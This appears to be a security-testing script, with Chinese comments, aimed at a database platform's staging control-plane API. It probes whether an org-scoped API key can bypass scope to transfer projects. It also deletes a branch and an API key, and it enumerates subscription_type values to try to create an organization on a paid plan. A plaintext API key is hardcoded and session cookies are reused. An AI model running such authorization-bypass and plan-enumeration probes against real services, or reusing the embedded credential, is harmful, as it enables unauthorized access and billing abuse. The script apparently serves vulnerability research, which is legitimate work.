# -*- coding: utf-8 -*-
"""org key scope bypass 验证:
1. 复用 sctest1 key(napi_e6p0kie19m1tbum8nz8trd8po3wrkp2vg3cdn035ttgdveh42wgd3wl12dnk1loc):
   a. 同 org 自 transfer -> 200? = 操作可达证明
   b. dest 伪造 org -> 404 not member(分层, handler 完整执行)
2. 清理: DELETE branch br-fragrant-darkness-w2rbcd7v + org key 1276718
3. org B 枚举 subscription_type(建第二 org 备用, 带 Referer)
"""
import http.client, ssl, json, re, html, sys, os, time

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST, cookie_str

ORG = 'org-flat-dawn-91601224'
PID = 'orange-sun-90493739'
KEY = 'napi_e6p0kie19m1tbum8nz8trd8po3wrkp2vg3cdn035ttgdveh42wgd3wl12dnk1loc'

def ctl_req(method, path, body=None, key=None, with_cookie=True, referer=None):
    try:
        fresh = {}
        csrf = None
        if with_cookie:
            conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=30)
            conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
            r = conn.getresponse(); r.read()
            for sc in r.headers.get_all('Set-Cookie') or []:
                m = re.match(r'([^=]+)=([^;]*)', sc)
                if m: fresh[m.group(1)] = m.group(2)
            conn.close()
            conn2 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=30)
            conn2.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
            r2 = conn2.getresponse(); txt = r2.read().decode('utf-8', 'replace'); conn2.close()
            m = re.search(r'<meta name="csrf-token" content="([^"]+)"', txt)
            csrf = html.unescape(m.group(1)) if m else None
        parts = []
        if with_cookie:
            for c in cookie_str().split(';'):
                c = c.strip()
                if c.startswith('_gorilla_csrf=') and '_gorilla_csrf' in fresh:
                    parts.append('_gorilla_csrf=' + fresh['_gorilla_csrf'])
                else:
                    parts.append(c)
        conn3 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=30)
        hdrs = {'User-Agent': 'Mozilla/5.0'}
        if with_cookie:
            hdrs['Cookie'] = '; '.join(parts)
        if key:
            hdrs['Authorization'] = 'Bearer ' + key
        if referer:
            hdrs['Referer'] = referer
        hdrs.update(HEADERS_TEST)
        if body is not None:
            hdrs['Content-Type'] = 'application/json'
        if csrf:
            hdrs['X-CSRF-Token'] = csrf
        conn3.request(method, path, body=json.dumps(body).encode() if body is not None else None, headers=hdrs)
        r3 = conn3.getresponse()
        out = r3.read().decode('utf-8', 'ignore')
        conn3.close()
        return r3.status, out
    except Exception as e:
        return -1, 'EXC %s' % e

print('=== 1a. key: 同 org 自 transfer ===', flush=True)
st, raw = ctl_req('POST', API_BASE + '/organizations/%s/projects/transfer' % ORG,
                  {'destination_org_id': ORG, 'project_ids': [PID]}, key=KEY, with_cookie=False)
print('-> %d %s' % (st, raw[:300].replace('\n', ' ')), flush=True)

print('\n=== 1b. key: dest=伪造 org ===', flush=True)
st, raw = ctl_req('POST', API_BASE + '/organizations/%s/projects/transfer' % ORG,
                  {'destination_org_id': ORG + '5', 'project_ids': [PID]}, key=KEY, with_cookie=False)
print('-> %d %s' % (st, raw[:300].replace('\n', ' ')), flush=True)

print('\n=== 1c. key: dest=不存在格式 org(000000) ===', flush=True)
st, raw = ctl_req('POST', API_BASE + '/organizations/%s/projects/transfer' % ORG,
                  {'destination_org_id': 'org-flat-dawn-00000000', 'project_ids': [PID]}, key=KEY, with_cookie=False)
print('-> %d %s' % (st, raw[:300].replace('\n', ' ')), flush=True)

print('\n=== 2a. cleanup: DELETE branch 残留 ===', flush=True)
st, raw = ctl_req('DELETE', API_BASE + '/projects/%s/branches/br-fragrant-darkness-w2rbcd7v' % PID)
print('-> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)

print('\n=== 2b. cleanup: DELETE org key 1276718 ===', flush=True)
st, raw = ctl_req('DELETE', API_BASE + '/organizations/%s/api_keys/1276718' % ORG)
print('-> %d %s' % (st, raw[:200].replace('\n', ' ')), flush=True)

print('\n=== 3. org B subscription_type 枚举 ===', flush=True)
for st_ in ['Free', 'free', 'PRO', 'pro', 'Pro', 'enterprise', 'Enterprise', 'scale', 'Scale',
            'launch', 'Launch', 'starter', 'Starter', 'team', 'Team', 'business', 'Business',
            'growth', 'Growth', 'premium', 'premium_plan', 'base', 'Base', 'basic', 'pro_plan',
            'plan_free', 'PRO_MONTHLY', 'scale_plan', 'launch_plan', 'free_plan']:
    st, raw = ctl_req('POST', API_BASE + '/organizations',
                      {'organization': {'name': 'scorgb1', 'handle': 'scorgb1'},
                       'subscription_type': st_},
                      referer='https://console-stage.neon.build/organizations')
    msg = raw[:150].replace('\n', ' ')
    print('%-14s -> %d %s' % (st_, st, msg), flush=True)
    if st == 201 or 'org' in raw.lower() and 'id' in raw:
        print('  !! org B created with %s' % st_, flush=True)
        break
    time.sleep(0.2)
